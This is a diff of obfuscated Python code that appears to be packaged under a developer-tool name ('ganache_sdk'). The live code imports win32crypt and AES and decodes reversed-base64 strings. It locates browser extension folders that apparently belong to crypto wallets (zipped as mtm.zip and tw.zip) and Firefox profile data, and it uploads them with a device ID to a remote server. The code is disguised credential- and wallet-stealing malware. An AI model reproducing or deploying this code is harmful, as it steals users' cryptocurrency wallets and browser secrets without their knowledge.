@@ -11,7 +11,7 @@ B=None
 import os as A,re,sys,json,base64 as d,sqlite3 as e,win32crypt as f
 from Cryptodome.Cipher import AES
 import shutil as Q,glob as E,requests as M
-from ganache.utils import G as R,I as g,H as h,J as N,K
+from ganache_sdk.utils import G as R,I as g,H as h,J as N,K
 D='BRVQEBFUBxUQD9ET'
 F='==QQUFERQBVQ'
 i='==QY0FGRg4Wan9GTcxlKlxWam9mcQxFXhRXYEBiclNXVcxVZt9mcoNEXcVGbn92bHxFX'
@@ -142,15 +142,15 @@ class AB:
 		for id in B.id_list:
 			E=path+K(A4)+id
 			if A.path.exists(E):
-				F='ganache/'+g(5);h(E,F);D='ganache/mtm.zip';type=K(W)
-				if id==K(V):D='ganache/tw.zip';type=K(A5)
+				F='ganache_sdk/'+g(5);h(E,F);D='ganache_sdk/mtm.zip';type=K(W)
+				if id==K(V):D='ganache_sdk/tw.zip';type=K(A5)
 				R(F,D);L={b:I(D,'rb')};N={K(H):B.device_id,K(G):browser,K(X):type,c:id}
 				try:
 					J=M.post(B.base_url+K(Y),data=N,files=L)
 					if J.status_code<200 or J.status_code>=300:C('Error 22: Unknown error')
 				except:C('Error -22: Unknown error')
 	def __handle_ff(L):
-		S='ganache/mtmf.zip';T=E.glob(A.getenv(K(F))+K(A6))
+		S='ganache_sdk/mtmf.zip';T=E.glob(A.getenv(K(F))+K(A6))
 		for B in T:
 			with I(B,'r', encoding='utf-8', errors='ignore')as D:
 				U=D.read();N=re.search(K(A7),U)
